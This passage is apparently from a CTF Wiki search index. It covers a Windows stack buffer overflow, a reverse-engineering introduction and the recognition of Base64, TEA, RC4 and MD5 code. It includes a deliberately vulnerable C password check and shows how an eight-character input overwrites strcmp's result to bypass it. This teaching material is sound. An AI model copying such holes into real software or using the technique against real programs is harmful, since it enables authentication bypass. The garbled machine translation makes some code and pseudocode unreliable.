normally, the rest of the function will be used because the program completes it. These registers, so this return value will be stored on the stack, which is ss:[0012FEA0] . ! [demo3] (./ figure / demo1-3.png) When executing to the second breakpoint, look at the stack structure. Where 61 is the ascii code form we entered a, and 00 is the string terminator. Then the size of buffer is 8 bytes. If we enter 8 a, the last string terminator will overflow to 0012FEA0 . This position overwrites the original value to 0, so we can change The execution flow of the program, output Congratulation! You have passed the verification! 0012FE90 CCCCCCCC 0012FE94 CCCCCCCC 0012FE98 61616161 0012FE9C CC006161 0012FEA0 00000001 Ok, let's let the program run normally. This time we enter 8 a to verify if we think the same: The end of the string will overflow to the return value of strcmp . You can see that the return value of strcmp is still 1. Continue to the second breakpoint and look at the current stack value. The return value of strcmp has been successfully overflowed from 1 to 0 . 0012FE90 CCCCCCCC 0012FE94 CCCCCCCC 0012FE98 61616161 0012FE9C 61616161 0012FEA0 00000000 At this time, let the program continue to run, and successfully output the expected string. Reference reading \u00b6 stack buffer overflow [0day security: software vulnerability analysis technology] () Winchecksec","title":"Stack Overflow Basics"},{"location":"pwn/windows/stackoverflow/stackoverflow-basic/#stack-overflow-principle","text":"","title":"Stack overflow principle"},{"location":"pwn/windows/stackoverflow/stackoverflow-basic/#introduction","text":"For an introduction to the stack, read the introduction in [Linux Pwn] ( https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro/ ).","title":"Introduction"},{"location":"pwn/windows/stackoverflow/stackoverflow-basic/#basic-example","text":"A typical example is given below, in which the last byte overflow occurs due to the order of the variable declarations and the size of the buffer declaration. #include <stdio.h> #define PASSWORD \"666666\" int verify_password ( char * password ) { int authenticated ; char buffer [ 8 ]; authenticated = strcmp ( password , PASSWORD ); strcpy ( buffer , password ); return authenticated ; } void main () { int valid_flag = 0 ; char password [ 128 ]; while ( 1 ) { printf ( \"please input password: \" ); scanf ( \"%s\" , password ); valid_flag = verify_password ( password ); if ( valid_flag != 0 ) { printf ( \"incorrect password! \\n \" ); } else { printf ( \"Congratulation! You have passed the verification! \\n \" ); break ; } } } This is a simple password verification program that will determine if the input string is equal to 666666. Use vc6.0 to compile this program. After successful, use winchecksec to view the protection that was opened. It can be seen that GS is turned on, but this does not hinder our overflow. C:\\Users\\CarlStar\\Desktop>winchecksec.exe demo1.exe Dynamic Base : false ASLR : true High Entropy VA : false Force Integrity : false Isolation : true NX : true SEH: true CFG : false RFG : false SafeSEH : true GS : true Authenticode : false .NET : true Use OllyDbg to dynamically debug this program, enter aaaaaa and see the normal execution flow of the program. To make it easier to understand the whole process, the next breakpoint is executed after the strcmp function and strcpy are executed. Now let the program run, after entering aaaaaa, the program will execute to the first breakpoint under us. Go to the strcmp function and observe its return value. Because the ascii code value of a is greater than the ascii code value of 6, no unexpected function will return 1 , the return value under x86 is saved in the EAX register, after the function returns normally, the rest of the function will be used because the program completes it. These registers, so this return value will be stored on the stack, which is ss:[0012FEA0] . ! [demo3] (./ figure / demo1-3.png) When executing to the second breakpoint, look at the stack structure. Where 61 is the ascii code form we entered a, and 00 is the string terminator. Then the size of buffer is 8 bytes. If we enter 8 a, the last string terminator will overflow to 0012FEA0 . This position overwrites the original value to 0, so we can change The execution flow of the program, output Congratulation! You have passed the verification! 0012FE90 CCCCCCCC 0012FE94 CCCCCCCC 0012FE98 61616161 0012FE9C CC006161 0012FEA0 00000001 Ok, let's let the program run normally. This time we enter 8 a to verify if we think the same: The end of the string will overflow to the return value of strcmp . You can see that the return value of strcmp is still 1. Continue to the second breakpoint and look at the current stack value. The return value of strcmp has been successfully overflowed from 1 to 0 . 0012FE90 CCCCCCCC 0012FE94 CCCCCCCC 0012FE98 61616161 0012FE9C 61616161 0012FEA0 00000000 At this time, let the program continue to run, and successfully output the expected string.","title":"Basic example"},{"location":"pwn/windows/stackoverflow/stackoverflow-basic/#reference-reading","text":"stack buffer overflow [0day security: software vulnerability analysis technology] () Winchecksec","title":"Reference reading"},{"location":"reverse/introduction/","text":"definition \u00b6 Reverse engineering, also called back engineering, is the process by which a man-made object is deconstructed to reveal its designs, architecture, or to extract knowledge from the object; ------ from wikipedia Software code reversal mainly refers to reverse disassembly and analysis of software structure, process, algorithm, code, etc. Application area \u00b6 Mainly used in software maintenance, software cracking, vulnerability mining, malicious code analysis. Reverse in the CTF competition \u00b6 > A variety of programming technologies involving Windows, Linux, and Android platforms require reverse analysis of source code and binary files using common tools, mastering the reverse analysis of Android mobile application APK files, mastering encryption and decryption, kernel programming, algorithms, anti-debugging, and Code obfuscation technology. > ------ \"National College Student Information Security Competition Entry Guide\" Claim \u00b6 Familiar with related knowledge such as operating system, assembly language, encryption and decryption Experience in programming with a variety of high-level languages Familiar with the compiler principle of multiple compilers Strong program understanding and reverse analysis capabilities Regular reverse process \u00b6 Collect information using static analysis tools such as strings/file/binwalk/IDA and perform a google/github search based on these static information. Study the protection methods of the program, such as code obfuscation, protective shell and anti-debugging techniques, and try to break or bypass protection Disassemble the target software and quickly locate the key code for analysis Combine dynamic debugging, verify your initial guess, and clarify the program function during the analysis process. For the program function, write the corresponding script to solve the flag Positioning key code tips \u00b6 Analyze control flow The control flow can be seen in the Control Flow Chart (CFG) generated by IDA. The disassembly code is read block by block along the branch loop and function call. Using data, code cross-references For example, the output prompt string can be found through the data cross-reference to find the corresponding call location, and then find the key code. Code cross-references such as graphical interface programs to get user input, you can use the corresponding windowsAPI function, we can find the key code through these API function call location. Reverse tips \u00b6 Coding style Each programmer's coding style is different. Students who are familiar with the development design pattern can analyze the function module function more quickly. Principle of concentration When programmers develop programs, they are often used to write function-related code or data in the same place, and this can be shown in disassembled code, so you can view functions and data near key code during analysis. Code reuse Code reuse is very common, and Github, the largest source code repository, is the primary source. In the analysis, you can find some features (such as strings, code styles, etc.) to search on Github, you may find similar code, and recover the missing symbol information during analysis. Seven points reverse three-point guess Reasonable guessing can often get twice the result with half the effort. If you encounter a suspicious function but can't see the logic inside, you can guess the function according to the clues and continue to analyze it according to the guess. In the constant guessing, it may help you get closer to the code. The truth. Distinguishing code To get the disassembly code, you must be able to distinguish which code is written manually and which is automatically appended by the compiler. In the code written by man, what are the library function codes, which are the code written by the questioner himself, and how is the code of the questioner optimized by the compiler? It is important that we don't have to spend time on code outside of the issuer. If you analyze the half-day in the library function, it will not only experience very bad results, but also have no effect. Patience In any case, given enough time, you can always analyze a program thoroughly. But it should not be abandoned too early. I believe that I can definitely break through the problem in the process of twitching and stripping. Dynamic Analysis \u00b6 The purpose of dynamic analysis is to locate the key code and verify its inference or understand the program function by outputting information (register, memory change, program output) during the running of the program. The main methods are: debugging, symbol execution, stain analysis Algorithm and data structure identification \u00b6 Common algorithm identification Such as Tea/XTea/XXTea/IDEA/RC4/RC5/RC6/AES/DES/IDEA/MD5/SHA256/SHA1 and other encryption algorithms, large number addition, subtraction, multiplication and division, shortest path and other traditional algorithms Common data structure identification The identification of advanced data structures such as diagrams, trees, and hash tables in assembly code. Code obfuscation \u00b6 For example, using tools such as OLLVM , movfuscator , flower instruction , virtualization and SMC to confuse the code makes program analysis very difficult. Then there is also anti-aliasing technology, the main purpose is to restore the control flow. Such as simulation execution and symbol execution Protective shell \u00b6 There are many types of protective shells, and simple compressed shells can be classified into the following types. unpack -> execute Extract the program code directly into memory and continue executing the program code. unpack -> execute -> unpack -> execute ... Unzip part of the code and execute it while decompressing unpack -> [decoder | encoded code] -> decode -> execute The program code has been coded, and after decompressing, the function is executed to decode the real program code. There are also related methods for shelling, such as single stepping method , `ESP law', etc. \u53cdDebug \u00b6 Anti-debugging is intended to prevent the program from being debugged and analyzed by means such as detecting the debugger. For example, use some API functions such as IsDebuggerPresent to detect the debugger, use SEH exception handling , time difference detection and other methods. It can also be protected by overwriting the debug port, self-tuning, and so on. Unconventional reverse thinking \u00b6 Unconventional reverse problem design has a wide range of topics and can be any format file of any architecture. lua/python/java/lua-jit/haskell/applescript/js/solidity/webassembly/etc.. firmware/raw bin/etc.. chip8/avr/clemency/risc-v/etc. However, the method of reverse engineering is not afraid of these unknown platform formats. In the case of such unconventional problems, we also have some basic processes that can be used universally. Pre-preparation \u00b6 Read the documentation. The quick way to learn the platform language is to read the official documentation. Official tools. The tools provided or recommended by the government are necessarily the most appropriate tools. Tutorial. On the reverse side, there may be many seniors who wrote reverse tutorials specific to the platform language, so they can quickly absorb this knowledge. Looking for tools \u00b6 Mainly look for file parsing tools , disassembler , debugger and decompiler . The disassembler&#39; is required, the debugger also contains the corresponding disassembly function, and for the decompiler', you have to ask for more blessings, and I am fortunate to lose my life. Looking for tools to sum up is: Google Dafa is good. Using Google search grammar reasonably, keyword search can help you find the right tool faster and better.","title":"Software Reverse Engineering Introduction"},{"location":"reverse/introduction/#definition","text":"Reverse engineering, also called back engineering, is the process by which a man-made object is deconstructed to reveal its designs, architecture, or to extract knowledge from the object; ------ from wikipedia Software code reversal mainly refers to reverse disassembly and analysis of software structure, process, algorithm, code, etc.","title":"definition"},{"location":"reverse/introduction/#application-area","text":"Mainly used in software maintenance, software cracking, vulnerability mining, malicious code analysis.","title":"Application area"},{"location":"reverse/introduction/#reverse-in-the-ctf-competition","text":"> A variety of programming technologies involving Windows, Linux, and Android platforms require reverse analysis of source code and binary files using common tools, mastering the reverse analysis of Android mobile application APK files, mastering encryption and decryption, kernel programming, algorithms, anti-debugging, and Code obfuscation technology. > ------ \"National College Student Information Security Competition Entry Guide\"","title":"Reverse in the CTF competition"},{"location":"reverse/introduction/#claim","text":"Familiar with related knowledge such as operating system, assembly language, encryption and decryption Experience in programming with a variety of high-level languages Familiar with the compiler principle of multiple compilers Strong program understanding and reverse analysis capabilities","title":"Claim"},{"location":"reverse/introduction/#regular-reverse-process","text":"Collect information using static analysis tools such as strings/file/binwalk/IDA and perform a google/github search based on these static information. Study the protection methods of the program, such as code obfuscation, protective shell and anti-debugging techniques, and try to break or bypass protection Disassemble the target software and quickly locate the key code for analysis Combine dynamic debugging, verify your initial guess, and clarify the program function during the analysis process. For the program function, write the corresponding script to solve the flag","title":"Regular reverse process"},{"location":"reverse/introduction/#positioning-key-code-tips","text":"Analyze control flow The control flow can be seen in the Control Flow Chart (CFG) generated by IDA. The disassembly code is read block by block along the branch loop and function call. Using data, code cross-references For example, the output prompt string can be found through the data cross-reference to find the corresponding call location, and then find the key code. Code cross-references such as graphical interface programs to get user input, you can use the corresponding windowsAPI function, we can find the key code through these API function call location.","title":"Positioning key code tips"},{"location":"reverse/introduction/#reverse-tips","text":"Coding style Each programmer's coding style is different. Students who are familiar with the development design pattern can analyze the function module function more quickly. Principle of concentration When programmers develop programs, they are often used to write function-related code or data in the same place, and this can be shown in disassembled code, so you can view functions and data near key code during analysis. Code reuse Code reuse is very common, and Github, the largest source code repository, is the primary source. In the analysis, you can find some features (such as strings, code styles, etc.) to search on Github, you may find similar code, and recover the missing symbol information during analysis. Seven points reverse three-point guess Reasonable guessing can often get twice the result with half the effort. If you encounter a suspicious function but can't see the logic inside, you can guess the function according to the clues and continue to analyze it according to the guess. In the constant guessing, it may help you get closer to the code. The truth. Distinguishing code To get the disassembly code, you must be able to distinguish which code is written manually and which is automatically appended by the compiler. In the code written by man, what are the library function codes, which are the code written by the questioner himself, and how is the code of the questioner optimized by the compiler? It is important that we don't have to spend time on code outside of the issuer. If you analyze the half-day in the library function, it will not only experience very bad results, but also have no effect. Patience In any case, given enough time, you can always analyze a program thoroughly. But it should not be abandoned too early. I believe that I can definitely break through the problem in the process of twitching and stripping.","title":"Reverse tips"},{"location":"reverse/introduction/#dynamic-analysis","text":"The purpose of dynamic analysis is to locate the key code and verify its inference or understand the program function by outputting information (register, memory change, program output) during the running of the program. The main methods are: debugging, symbol execution, stain analysis","title":"Dynamic Analysis"},{"location":"reverse/introduction/#algorithm-and-data-structure-identification","text":"Common algorithm identification Such as Tea/XTea/XXTea/IDEA/RC4/RC5/RC6/AES/DES/IDEA/MD5/SHA256/SHA1 and other encryption algorithms, large number addition, subtraction, multiplication and division, shortest path and other traditional algorithms Common data structure identification The identification of advanced data structures such as diagrams, trees, and hash tables in assembly code.","title":"Algorithm and data structure identification"},{"location":"reverse/introduction/#code-obfuscation","text":"For example, using tools such as OLLVM , movfuscator , flower instruction , virtualization and SMC to confuse the code makes program analysis very difficult. Then there is also anti-aliasing technology, the main purpose is to restore the control flow. Such as simulation execution and symbol execution","title":"Code obfuscation"},{"location":"reverse/introduction/#protective-shell","text":"There are many types of protective shells, and simple compressed shells can be classified into the following types. unpack -> execute Extract the program code directly into memory and continue executing the program code. unpack -> execute -> unpack -> execute ... Unzip part of the code and execute it while decompressing unpack -> [decoder | encoded code] -> decode -> execute The program code has been coded, and after decompressing, the function is executed to decode the real program code. There are also related methods for shelling, such as single stepping method , `ESP law', etc.","title":"Protective shell"},{"location":"reverse/introduction/#debug","text":"Anti-debugging is intended to prevent the program from being debugged and analyzed by means such as detecting the debugger. For example, use some API functions such as IsDebuggerPresent to detect the debugger, use SEH exception handling , time difference detection and other methods. It can also be protected by overwriting the debug port, self-tuning, and so on.","title":"\u53cdDebug"},{"location":"reverse/introduction/#unconventional-reverse-thinking","text":"Unconventional reverse problem design has a wide range of topics and can be any format file of any architecture. lua/python/java/lua-jit/haskell/applescript/js/solidity/webassembly/etc.. firmware/raw bin/etc.. chip8/avr/clemency/risc-v/etc. However, the method of reverse engineering is not afraid of these unknown platform formats. In the case of such unconventional problems, we also have some basic processes that can be used universally.","title":"Unconventional reverse thinking"},{"location":"reverse/introduction/#pre-preparation","text":"Read the documentation. The quick way to learn the platform language is to read the official documentation. Official tools. The tools provided or recommended by the government are necessarily the most appropriate tools. Tutorial. On the reverse side, there may be many seniors who wrote reverse tutorials specific to the platform language, so they can quickly absorb this knowledge.","title":"Pre-preparation"},{"location":"reverse/introduction/#looking-for-tools","text":"Mainly look for file parsing tools , disassembler , debugger and decompiler . The disassembler&#39; is required, the debugger also contains the corresponding disassembly function, and for the decompiler', you have to ask for more blessings, and I am fortunate to lose my life. Looking for tools to sum up is: Google Dafa is good. Using Google search grammar reasonably, keyword search can help you find the right tool faster and better.","title":"Looking for tools"},{"location":"reverse/Identify-Encode-Encryption/introduction/","text":"Foreword \u00b6 In the process of transforming data, in addition to simple byte operations, some common encoding and encryption algorithms are used, so if the corresponding encoding or encryption algorithm can be quickly identified, the entire integrity can be analyzed more quickly. Algorithm. Encryption algorithms commonly found in CTF reversals include base64, TEA, AES, RC4, MD5, and so on. Base64 \u00b6 Base64 is a representation of binary data based on 64 printable characters. When converting, put 3 bytes of data into a 24-bit buffer, and the first byte occupies the high position. If the data is less than 3 bytes, the remaining bits in the buffer are complemented by 0. Take 6 bits each time (because ), select by value ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ The characters in are used as encoded output until all input data conversion is completed. In general, the recognition feature of Base64 is the index table. When we can find the index table of ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ , we can basically determine the Base64 encoding through simple analysis. Of course, some index base64 index tables will change, some variants of base64 mainly modify the index table. Tea \u00b6 In [Cryptography] ( https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%AD%A6 ), Micro Encryption Algorithm , TEA) is an easy to describe and [execute] ( https://zh.wikipedia.org/w/index.php?title=%E6%89%A7%E8%A1%8C&action=edit&redlink=1 ) Block password] ( https://zh.wikipedia.org/wiki/%E5%A1%8A%E5%AF%86%E7%A2%BC ), usually only requires a small amount of code to achieve. The designer is [Cambridge University Computer Lab] ( https://en.wikipedia.org/wiki/%E5%89%91%E6%A1%A5%E5%A4%A7%E5%AD%A6 ) [David Wheeler] ( https://en.wikipedia.org/w/index.php?title=%E5%A4%A7%E5%8D%AB%C2%B7%E6%83%A0%E5 %8B%92&action=edit&redlink=1) with [Roger Niddam] ( https://en.wikipedia.org/w/index.php?title=%E7%BD%97%E6%9D%B0 % C2%B7%E5%B0%BC%E8%BE%BE%E5%A7%86&action=edit&redlink=1). Reference Code: #include <stdint.h> void encrypt ( uint32_t * v , uint32_t * k ) { uint32_t v0 = v [ 0 ], v1 = v [ 1 ], sum = 0 , i ; /* set up */ uint32_t delta = 0x9e3779b9 ; /* a key schedule constant */ uint32_t k0 = k [ 0 ], k1 = k [ 1 ], k2 = k [ 2 ], k3 = k [ 3 ]; / * cache key * / for ( i = 0 ; i < 32 ; i ++ ) { /* basic cycle start */ sum + = delta ; v0 + = (( v1 & lt ; & lt ; 4 ) + k0 ) ^ ( v1 + sum ) ^ (( v1 & gt ; & gt ; 5 ) + k1 ); v1 + = (( v0 & lt ; & lt ; 4 ) + k2 ) ^ ( v0 + sum ) ^ (( v0 & gt ; & gt ; 5 ) + k3 ); } /* end cycle */ v [ 0 ] = v0 ; v [ 1 ] = v1 ; } void decrypt ( uint32_t * v , uint32_t * k ) { uint32_t v0 = v [ 0 ], v1 = v [ 1 ], sum = 0xC6EF3720 , i ; / * set up * / uint32_t delta = 0x9e3779b9 ; /* a key schedule constant */ uint32_t k0 = k [ 0 ], k1 = k [ 1 ], k2 = k [ 2 ], k3 = k [ 3 ]; / * cache key * / for ( i = 0 ; i < 32 ; i ++ ) { /* basic cycle start */ v1 - = (( v0 & lt ; & lt ; 4 ) + k2 ) ^ ( v0 + sum ) ^ (( v0 & gt ; & gt ; 5 ) + k3 ); v0 - = (( v1 & lt ; & lt ; 4 ) + k0 ) ^ ( v1 + sum ) ^ (( v1 & gt ; & gt ; 5 ) + k1 ); sum - = delta ; } /* end cycle */ v [ 0 ] = v0 ; v [ 1 ] = v1 ; } The main recognition feature in the Tea algorithm is to have an image number : 0x9e3779b9 . Of course, this Tea algorithm also has a magic change, interested can see 2018 0ctf Quals milk-tea. RC4 \u00b6 In [Cryptography] ( https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8 ), RC4 (from Rivest Cipher 4 Abbreviation) is a [stream encryption] ( https://zh.wikipedia.org/wiki/%E6%B5%81%E5%8A%A0%E5%AF%86 ) algorithm, [key] (https: //zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5) Variable length. It uses the same key for encryption and decryption, so it also belongs to [symmetric encryption algorithm] ( https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5 %AF%86). RC4 is [Wired Equivalent Encryption] ( https://en.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A % The encryption algorithm used in A0%E5%AF%86) (WEP) was also [TLS] ( https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5 %B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE) One of the algorithms that can be used. Void rc4_init ( unsigned char * s , unsigned char * key , unsigned long Len ) //Initialization function { int i = 0 , j = 0 ; char k [ 256 ] = { 0 }; unsigned char tmp = 0 ; for ( i = 0 ; i < 256 ; i ++ ) { s [ i ] = i ; k [ i ] = key [ i % Len ]; } for ( i = 0 ; i < 256 ; i ++ ) { j = ( j + s [ i ] + k [ i ]) % 256 ; tmp = s [ i ]; s [ i ] = s [ j ]; //exchange s[i] and s[j] s [ j ] = tmp ; } } void rc4_crypt ( unsigned char * s , unsigned char * Data , unsigned long Len ) //\u52a0\u89e3\u5bc6 { int i = 0 , j = 0 , t = 0 ; unsigned long k = 0 ; unsigned char tmp ; for ( k = 0 ; k < Len ; k ++ ) { i = ( i + 1 ) % 256 ; j = ( j + s [ i ]) % 256 ; tmp = s [ i ]; s [ i ] = s [ j ]; // swap s[x] and s[y] s [ j ] = tmp ; t = ( s [ i ] + s [ j ]) % 256 ; Data [ k ] ^= s [ t ]; } } By analyzing the initialization code, it can be seen that in the initialization code, the character array s is initialized and assigned, and the assignment values are incremented. Then 256 exchange operations were performed on s. The rc4 algorithm can be known by identifying the initialization code. Its pseudo code is expressed as: Initialize [S box] with a length of 256 ( https://zh.wikipedia.org/wiki/S%E7%9B%92 ). The first for loop loads 0 to 255 non-repeating elements into the S box. The second for loop scrambles the S box based on the key. for i from 0 to 255 S [ i ] := i endfor j : = 0 for ( i = 0 ; i < 256 ; i ++ ) j : = ( j + S [ i ] + key [ i mod keylength ]) % 256 swap values of S [ i ] and S [ j ] endfor Below i, j are two pointers. Each time a byte is received, a while loop is performed. An element in the S box is located by a certain algorithm ((a), (b)) and XORed with the input byte to obtain k. The S box (\u00a9) is also changed in the loop. If the input is [plain text] ( https://zh.wikipedia.org/wiki/%E6%98%8E%E6%96%87 ), the output is [ciphertext] ( https://zh.wikipedia . Org/wiki/%E5%AF%86%E6%96%87); if the input is ciphertext, the output is plaintext. i : = 0 j : = 0 while GeneratingOutput : i : = ( i + 1 ) mod 256 //a j : = ( j + S [ i ]) mod 256 //b swap values of S [ i ] and S [ j ] //c k : = inputByte ^ S [( S [ i ] + S [ j ]) % 256 ] output K endwhile This algorithm guarantees that each element of the S box is exchanged at least once every 256 cycles. MD5 \u00b6 MD5 Message-Digest Algorithm , a widely used [cryptographic hash function] ( https://en.wikipedia.org/wiki/%E5%AF%86 %) E7%A2%BC%E9%9B%9C%E6%B9%8A%E5%87%BD%E6%95%B8), can produce a 128-bit (16 [bytes] ( https://zh . wikipedia.org/wiki/%E5%AD%97%E8%8A%82)) The hash value used to ensure complete and consistent information transfer. MD5 by American cryptographer [Ronald Levist] ( https://en.wikipedia.org/wiki/%E7%BD%97%E7%BA%B3%E5%BE%B7%C2%B7 % E6%9D%8E%E7%BB%B4%E6%96%AF%E7%89%B9) (Ronald Linn Rivest) designed to be published in 1992 to replace [MD4] ( https://en.wikipedia .org/wiki/MD4) algorithm. The program for this algorithm is specified in [RFC 1321] ( https://tools.ietf.org/html/rfc1321 ). The pseudo code is expressed as: /Note: All variables are unsigned 32 bits and wrap modulo 2^32 when calculating was int [64] r, k //r specifies the per-round shift amounts r[ 0..15]\uff1a= {7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22} r[16..31]\uff1a= {5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20} r[32..47]\uff1a= {4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23} r[48..63]\uff1a= {6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21} //Use binary integer part of the sines of integers as constants: for i from 0 to 63 k[i] := floor(abs(sin(i + 1)) \u00d7 2^32) //Initialize variables: was int h0: = 0x67452301 was int h1: = 0xEFCDAB89 was int h2: = 0x98BADCFE was int h3: = 0x10325476 //Pre-processing: append \"1\" bit to message append \"0\" bits until message length in bits \u2261 448 (mod 512) append bit length of message as 64-bit little-endian integer to message //Process the message in successive 512-bit chunks: for each 512-bit chunk of message break chunk into sixteen 32-bit little-endian words w[i], 0 \u2264 i \u2264 15 //Initialize hash value for this chunk: var int a: = h0 was int b: = h1 was int c: = h2 var int d: = h3 //Main loop: for i from 0 to 63 if 0 \u2264 i \u2264 15 then f := (b and c) or ((not b) and d) g: = i else if 16 \u2264 i \u2264 31 f := (d and b) or ((not d) and c) g: = (5 \u00d7 i + 1) vs. 16 else if 32 \u2264 i \u2264 47 f := b xor c xor d g: = (3 \u00d7 i + 5) vs. 16 else if 48 \u2264 i \u2264 63 f := c xor (b or (not d)) g: = (7 \u00d7 i) vs. 16 temp := d d := c c := b b := leftrotate((a + f + k[i] + w[g]),r[i]) + b a := temp Next i //Add this chunk's hash to result so far: h0 := h0 + a h1: = h1 + b h2 := h2 + c h3 := h3 + d End ForEach var int digest := h0 append h1 append h2 append h3 //(expressed as little-endian) Its distinctive features are: h0 = 0x67452301 ; h1 = 0xefcdab89 ; h2 = 0x98badcfe ; h3 = 0x10325476 ;","title":"Common Encryption Algorithms and Code Recognition"},{"location":"reverse/Identify-Encode-Encryption/introduction/#foreword","text":"In the process of transforming data, in addition to simple byte operations, some common encoding and encryption algorithms are used, so if the corresponding encoding or encryption algorithm can be quickly identified, the entire integrity can be analyzed more quickly. Algorithm. Encryption algorithms commonly found in CTF reversals include base64, TEA, AES, RC4, MD5, and so on.","title":"Foreword"},{"location":"reverse/Identify-Encode-Encryption/introduction/#base64","text":"Base64 is a representation of binary data based on 64 printable characters. When converting, put 3 bytes of data into a 24-bit buffer, and the first byte occupies the high position. If the data is less than 3 bytes, the remaining bits in the buffer are complemented by 0. Take 6 bits each time (because ), select by value ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ The characters in are used as encoded output until all input data conversion is completed. In general, the recognition feature of Base64 is the index table. When we can find the index table of ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ , we can basically determine the Base64 encoding through simple analysis. Of course, some index base64 index tables will change, some variants of base64 mainly modify the index table.","title":"Base64"},{"location":"reverse/Identify-Encode-Encryption/introduction/#tea","text":"In [Cryptography] ( https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%AD%A6 ), Micro Encryption Algorithm , TEA) is an easy to describe and [execute] ( https://zh.wikipedia.org/w/index.php?title=%E6%89%A7%E8%A1%8C&action=edit&redlink=1 ) Block password] ( https://zh.wikipedia.org/wiki/%E5%A1%8A%E5%AF%86%E7%A2%BC ), usually only requires a small amount of code to achieve. The designer is [Cambridge University Computer Lab] ( https://en.wikipedia.org/wiki/%E5%89%91%E6%A1%A5%E5%A4%A7%E5%AD%A6 ) [David Wheeler] ( https://en.wikipedia.org/w/index.php?title=%E5%A4%A7%E5%8D%AB%C2%B7%E6%83%A0%E5 %8B%92&action=edit&redlink=1) with [Roger Niddam] ( https://en.wikipedia.org/w/index.php?title=%E7%BD%97%E6%9D%B0 % C2%B7%E5%B0%BC%E8%BE%BE%E5%A7%86&action=edit&redlink=1). Reference Code: #include <stdint.h> void encrypt ( uint32_t * v , uint32_t * k ) { uint32_t v0 = v [ 0 ], v1 = v [ 1 ], sum = 0 , i ; /* set up */ uint32_t delta = 0x9e3779b9 ; /* a key schedule constant */ uint32_t k0 = k [ 0 ], k1 = k [ 1 ], k2 = k [ 2 ], k3 = k [ 3 ]; / * cache key * / for ( i = 0 ; i < 32 ; i ++ ) { /* basic cycle start */ sum + = delta ; v0 + = (( v1 & lt ; & lt ; 4 ) + k0 ) ^ ( v1 + sum ) ^ (( v1 & gt ; & gt ; 5 ) + k1 ); v1 + = (( v0 & lt ; & lt ; 4 ) + k2 ) ^ ( v0 + sum ) ^ (( v0 & gt ; & gt ; 5 ) + k3 ); } /* end cycle */ v [ 0 ] = v0 ; v [ 1 ] = v1 ; } void decrypt ( uint32_t * v , uint32_t * k ) { uint32_t v0 = v [ 0 ], v1 = v [ 1 ], sum = 0xC6EF3720 , i ; / * set up * / uint32_t delta = 0x9e3779b9 ; /* a key schedule constant */ uint32_t k0 = k [ 0 ], k1 = k [ 1 ], k2 = k [ 2 ], k3 = k [ 3 ]; / * cache key * / for ( i = 0 ; i < 32 ; i ++ ) { /* basic cycle start */ v1 - = (( v0 & lt ; & lt ; 4 ) + k2 ) ^ ( v0 + sum ) ^ (( v0 & gt ; & gt ; 5 ) + k3 ); v0 - = (( v1 & lt ; & lt ; 4 ) + k0 ) ^ ( v1 + sum ) ^ (( v1 & gt ; & gt ; 5 ) + k1 ); sum - = delta ; } /* end cycle */ v [ 0 ] = v0 ; v [ 1 ] = v1 ; } The main recognition feature in the Tea algorithm is to have an image number : 0x9e3779b9 . Of course, this Tea algorithm also has a magic change, interested can see 2018 0ctf Quals milk-tea.","title":"Tea"},{"location":"reverse/Identify-Encode-Encryption/introduction/#rc4","text":"In [Cryptography] ( https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8 ), RC4 (from Rivest Cipher 4 Abbreviation) is a [stream encryption] ( https://zh.wikipedia.org/wiki/%E6%B5%81%E5%8A%A0%E5%AF%86 ) algorithm, [key] (https: //zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5) Variable length. It uses the same key for encryption and decryption, so it also belongs to [symmetric encryption algorithm] ( https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5 %AF%86). RC4 is [Wired Equivalent Encryption] ( https://en.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A % The encryption algorithm used in A0%E5%AF%86) (WEP) was also [TLS] ( https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5 %B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE) One of the algorithms that can be used. Void rc4_init ( unsigned char * s , unsigned char * key , unsigned long Len ) //Initialization function { int i = 0 , j = 0 ; char k [ 256 ] = { 0 }; unsigned char tmp = 0 ; for ( i = 0 ; i < 256 ; i ++ ) { s [ i ] = i ; k [ i ] = key [ i % Len ]; } for ( i = 0 ; i < 256 ; i ++ ) { j = ( j + s [ i ] + k [ i ]) % 256 ; tmp = s [ i ]; s [ i ] = s [ j ]; //exchange s[i] and s[j] s [ j ] = tmp ; } } void rc4_crypt ( unsigned char * s , unsigned char * Data , unsigned long Len ) //\u52a0\u89e3\u5bc6 { int i = 0 , j = 0 , t = 0 ; unsigned long k = 0 ; unsigned char tmp ; for ( k = 0 ; k < Len ; k ++ ) { i = ( i + 1 ) % 256 ; j = ( j + s [ i ]) % 256 ; tmp = s [ i ]; s [ i ] = s [ j ]; // swap s[x] and s[y] s [ j ] = tmp ; t = ( s [ i ] + s [ j ]) % 256 ; Data [ k ] ^= s [ t ]; } } By analyzing the initialization code, it can be seen that in the initialization code, the character array s is initialized and assigned, and the assignment values are incremented. Then 256 exchange operations were performed on s. The rc4 algorithm can be known by identifying the initialization code. Its pseudo code is expressed as: Initialize [S box] with a length of 256 ( https://zh.wikipedia.org/wiki/S%E7%9B%92 ). The first for loop loads 